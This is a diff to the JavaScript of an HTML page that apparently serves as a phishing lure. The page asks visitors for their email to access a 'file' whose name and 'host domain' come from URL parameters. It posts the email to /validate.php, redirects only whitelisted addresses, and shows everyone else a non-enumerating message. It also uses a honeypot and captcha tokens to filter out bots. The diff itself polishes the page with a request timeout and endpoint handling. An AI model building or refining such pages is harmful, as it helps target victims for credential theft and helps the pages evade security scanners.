@@ -249,15 +249,15 @@
   const email = document.getElementById('email');
   const btn   = document.getElementById('continueBtn');
 
-  // Optional hidden fields (added below)
-  const cfTok = document.getElementById('cfToken');      // may be null
-  const hp    = document.getElementById('middleName');   // honeypot
+  // Optional hidden fields (ok if missing)
+  const cfTok = document.getElementById('cfToken');    // e.g., Turnstile/Recaptcha
+  const hp    = document.getElementById('middleName'); // honeypot (must stay empty)
 
-  // enable button only when email shape is OK
+  // Enable button only when email shape is OK
   const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
   email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
 
-  // helper: show a neutral message
+  // Message helper
   function showMsg(text, ok=false){
     let el = document.getElementById('alert');
     if (!el) {
@@ -273,12 +273,16 @@
     el.style.fontSize = '12px';
   }
 
-  // Progressive-enhanced JSON submit (your backend requires JSON)
+  // Resolve endpoint from form action (defaults to /validate.php)
+  const endpoint = new URL(form.getAttribute('action') || '/validate.php', location.href).toString();
+
+  // Progressive-enhanced JSON submit (backend expects JSON)
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
-
-    // FRONT-END GUARD: keep disabled if bad shape
-    if (!looksLikeEmail(email.value)) return;
+    if (!looksLikeEmail(email.value)) {
+      showMsg('Please enter a valid email address.');
+      return;
+    }
 
     btn.disabled = true;
     const original = btn.textContent;
@@ -288,44 +292,51 @@
       email: String(email.value || '').trim().toLowerCase(),
       jsToken: 'ok-' + Math.random().toString(36).slice(2),
       cfToken: cfTok ? cfTok.value : '',
-      middleName: hp ? hp.value : ''   // must be empty, or backend will flag honeypot
+      middleName: hp ? hp.value : ''   // must be empty; backend flags bots otherwise
     };
 
+    // Timeout after 12s to avoid hanging UI
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 12000);
+
     try {
-      const res = await fetch(form.getAttribute('action') || '/verify', {
+      const res = await fetch(endpoint, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json; charset=utf-8',
           'X-Client-Lang': navigator.language || 'en'
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(payload),
+        signal: ctl.signal
       });
 
-      const data = await res.json().catch(() => ({}));
+      let data = null;
+      try { data = await res.json(); } catch { data = {}; }
 
+      // Success path (whitelisted): backend returns { valid:true, redirect:"..." }
       if (res.ok && data && data.valid && data.redirect) {
-        // ✅ whitelisted — backend gave us a redirect URL
         showMsg(data.message || 'Validated', true);
         location.assign(data.redirect);
         return;
       }
 
-      // Neutral messaging (avoid membership leaks)
-      const msg = (data && data.message) || 'Unable to verify your email. Please try again.';
+      // Friendly, non-enumerating message for all other cases
       showMsg('If your email is permitted for this file, you will receive access shortly.');
     } catch (err) {
       showMsg('Network issue. Please retry in a moment.');
     } finally {
+      clearTimeout(t);
       btn.disabled = !looksLikeEmail(email.value);
       btn.textContent = original;
     }
   });
 
-  // Optional query params → UI
+  // Optional: query params → UI
   const q = new URLSearchParams(location.search);
   if (q.get('file')) document.getElementById('fileName').textContent = q.get('file');
   if (q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
 </script>
+
 
 </body>
 </html>
